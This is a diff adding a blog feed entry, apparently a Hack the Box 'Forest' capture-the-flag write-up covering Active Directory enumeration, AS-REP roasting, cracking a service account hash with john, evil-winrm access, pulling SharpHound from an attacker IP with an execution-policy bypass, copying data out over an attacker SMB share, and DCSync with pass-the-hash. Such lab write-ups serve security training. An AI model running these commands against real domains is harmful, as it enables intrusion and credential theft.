@@ -610,6 +610,138 @@ The scan results:</p>
         </item>
         
         <item>
+            <title>Hack the Box - Forest - Write Up</title>
+            <link>https://nmmorette.github.io/posts/2022/06/hack-the-box-forest-write-up/</link>
+            <pubDate>Mon, 13 Jun 2022 00:00:00 +0000</pubDate>
+            
+            <guid>https://nmmorette.github.io/posts/2022/06/hack-the-box-forest-write-up/</guid>
+            <description>Forest Enumeration nmap Initian enumeration with nmap
+Some usefull information:
+Computer name: FOREST | NetBIOS computer name: FOREST\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2022-06-13T01:57:38-07:00 OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) Users Lets enumerate users. For the user enumeration, we can search for objectClass as person and search for sAMAccountName:.</description>
+            <content type="html"><![CDATA[<h1 id="forest">Forest</h1>
+<p><img src="/images/htb/Forest/2023-10-18_19-30.png" alt="2023-10-18_19-30.png"></p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<p>Initian enumeration with nmap</p>
+<p><img src="/images/htb/Forest/Untitled.png" alt="Untitled"></p>
+<p>Some usefull information:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Computer name: FOREST
+|   NetBIOS computer name: FOREST<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2022-06-13T01:57:38-07:00
+
+OS: Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2016</span> Standard 6.3
+
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: htb.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+
+</code></pre></div><h3 id="users">Users</h3>
+<p>Lets enumerate users. For the user enumeration, we can search for <code>objectClass</code> as person and search for <code>sAMAccountName:</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">=======================================(</span> Users on 10.129.95.210 <span style="color:#f92672">)=======================================</span>
+user:<span style="color:#f92672">[</span>Administrator<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f4<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>Guest<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f5<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>krbtgt<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f6<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>DefaultAccount<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f7<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>$331000-VK4ADACQNUCA<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x463<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>SM_2c8eef0a09b545acb<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x464<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>SM_ca8c2ed5bdab4dc9b<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x465<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>SM_75a538d3025e4db9a<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x466<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>SM_681f53d4942840e18<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x467<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>SM_1b41c9286325456bb<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x468<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>SM_9b69f1b9d2cc45549<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x469<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>SM_7c96b981967141ebb<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46a<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>SM_c75ee099d0a64c91b<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46b<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>SM_1ffab36a2f5f479cb<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46c<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>HealthMailboxc3d7722<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46e<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>HealthMailboxfc9daad<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46f<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>HealthMailboxc0a90c9<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x470<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>HealthMailbox670628e<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x471<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>HealthMailbox968e74d<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x472<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>HealthMailbox6ded678<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x473<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>HealthMailbox83d6781<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x474<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>HealthMailboxfd87238<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x475<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>HealthMailboxb01ac64<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x476<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>HealthMailbox7108a4e<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x477<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>HealthMailbox0659cc1<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x478<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>sebastien<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x479<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>lucinda<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47a<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>svc-alfresco<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47b<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>andy<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47e<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>mark<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47f<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>santi<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x480<span style="color:#f92672">]</span>
+</code></pre></div><h2 id="asreproast">ASREPRoast</h2>
+<blockquote>
+<p><em><strong>EXPLANATION- For the user accounts that are enabled with no pre-Authentication,(basically Kerberos pre-authentication is disabled) it’s vulnerable to AS-REP Roasting attack. We can request for that user’s Kerberos TGT ticket without providing any authentication, and the TGT ticket which we will get back will be encrypted with the account’s password. So we can crack the hash offline.Using the Impacket’s GetNPUsers.py script, we can do the attack:</strong></em></p>
+</blockquote>
+<p>Save the list of users in a file, and lets use <code>GetNPUsers.py</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GetNPUsers.py htb.local/ -no-pass -usersfile users    
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User lucinda doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span><span style="color:#e6db74">$krb5asrep$23$svc-alfresco@HTB.LOCAL:28a1170a7195863540958b52e6bbb280$d4652fa91e48bbd92d0ab6e48587a387facdd084a00e7b6af81269add267b96ba8d96e1cabf89c5cef9dfa036407d43fb111358a68a8a2a2cc289177d6f6778e40aba64ec828fd108050edbbe7aacfa098897f8012539de5aec2921234790474b73773b291561b3b775117ea23e8ac3a969db66fb99e8156fd89e00c4769b548e597030639d1cc4433b3978782f75e1661a977680dfbc6cefc08354b01c253669d9af8ad6abe3e5c55742d99a9d5c1787b1c1019f23b20dca3a6ff806be411d06b2c0efae4e2357452ed943520019020e7d951bd6bd2de6d02cd66079120233d1e718e8a561d
+</span><span style="color:#e6db74">[-] User andy doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User mark doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span><span style="color:#e6db74">[-] User santi doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</code></pre></div><h3 id="cracking-the-password">Cracking the Password</h3>
+<p>The Kerberos pre-authentication for the user <em>svc-alfresco</em> is turned off, and the KDC provided a TGT encrypted using the user&rsquo;s password.</p>
+<p>Store the encrypted TGT in a file named hash.txt. We&rsquo;ll then decrypt it using hashcat. Given that the hash is of type NTLMv2, we&rsquo;ll utilize the -m 18200 flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash     
+Using default input encoding: UTF-8
+Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>krb5asrep, Kerberos <span style="color:#ae81ff">5</span> AS-REP etype 17/18/23 <span style="color:#f92672">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x<span style="color:#f92672">])</span>
+Will run <span style="color:#ae81ff">4</span> OpenMP threads
+Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+s3rvice          <span style="color:#f92672">(</span>$krb5asrep$23$svc-alfresco@HTB.LOCAL<span style="color:#f92672">)</span>     
+1g 0:00:00:28 DONE <span style="color:#f92672">(</span>2022-06-13 05:21<span style="color:#f92672">)</span> 0.03519g/s 143814p/s 143814c/s 143814C/s s401447401447401447..s3r2s1
+Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div><p>⚠️ svc-alfresco:s3rvice</p>
+<p>Testing the credentials:</p>
+<p><img src="/images/htb/Forest/Untitled%201.png" alt="Untitled"></p>
+<p><img src="/images/htb/Forest/Untitled%202.png" alt="Untitled"></p>
+<h2 id="connection">Connection</h2>
+<p>The password of the user <strong>svc-alfresco</strong> is <strong>s3rvice</strong>. Now since we have the svc-alfresco’s password we can log in using <strong>crackmapexecor evil-winrm</strong> to gain initial foothold.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
+</code></pre></div><p>Getting user flag:</p>
+<p><img src="/images/htb/Forest/Untitled%203.png" alt="Untitled"></p>
+<h3 id="local-enumeration">Local enumeration</h3>
+<p>Copy sharphound.exe to the machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Powershell.exe -ExecutionPolicy Bypass Invoke-WebRequest <span style="color:#e6db74">&#34;http://10.10.16.13/sharphound.exe&#34;</span> -OutFile <span style="color:#e6db74">&#34;sharp.exe&#34;</span>
+</code></pre></div><p>Execute:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./sharp.exe -c all --zipfilename forest.zip
+</code></pre></div><p><img src="/images/htb/Forest/Untitled%204.png" alt="Untitled"></p>
+<p>Open a smb server to file transfer:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbserver.py -comment SHARE -username test -password test -ip 10.10.14.8 -port <span style="color:#ae81ff">445</span> -smb2support SHARE ./
+</code></pre></div><p>Map the drive and copy the file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">net use y: <span style="color:#ae81ff">\\</span>10.10.14.8<span style="color:#ae81ff">\S</span>HARE /user:test test
+copy 20220613040930_file.zip y:
+</code></pre></div><p>Drag the zip into the bloodhound</p>
+<p><img src="/images/htb/Forest/Untitled%205.png" alt="Untitled"></p>
+<p>Use the query “Shortest Paths to Domain Admins from Owned Principals”</p>
+<p><img src="/images/htb/Forest/Untitled%206.png" alt="Untitled"></p>
+<p>Use the query “Shortestpaths to high value targets”</p>
+<p><img src="/images/htb/Forest/Untitled%207.png" alt="Untitled"></p>
+<p><img src="/images/htb/Forest/Untitled%208.png" alt="Untitled"></p>
+<p>One of the paths shows that the Exchange Windows Permissions group has WriteDACL privileges on the Domain. The WriteDACL privilege allows a user to add ACLs to an object. This implies that we can include a user in this group and grant them DCSync rights.</p>
+<h2 id="dcsync---exploit">DCSync - Exploit</h2>
+<p>Crete a new user and set the group:</p>
+<p><img src="/images/htb/Forest/Untitled%209.png" alt="Untitled"></p>
+<p>Copy PowerView to the host and run Bypass-AMSI.</p>
+<p>The Bypass-AMSI command is used to bypass Defender before importing the script. Next, we can use the Add-ObjectACL with John&rsquo;s credentials, and grant him DCSync rights.</p>
+<p>Assigning DCSync rights to the user:</p>
+<p><img src="/images/htb/Forest/Untitled%2010.png" alt="Untitled"></p>
+<p>Dump the credentials:</p>
+<p><img src="/images/htb/Forest/Untitled%2011.png" alt="Untitled"></p>
+<p>I attempted cracking without success, so I resorted to using pass the hash with <code>psexec</code></p>
+<p><img src="/images/htb/Forest/Untitled%2012.png" alt="Untitled"></p>
+<p>Getting root flag:</p>
+<p><img src="/images/htb/Forest/Untitled%2013.png" alt="Untitled"></p>
+<p><img src="/images/htb/Forest/Untitled%2014.png" alt="Untitled"></p>
+]]></content>
+        </item>
+        
+        <item>
             <title>Hack the Box - Blue- Write Up</title>
             <link>https://nmmorette.github.io/posts/2022/03/hack-the-box-blue-write-up/</link>
             <pubDate>Mon, 14 Mar 2022 00:00:00 +0000</pubDate>
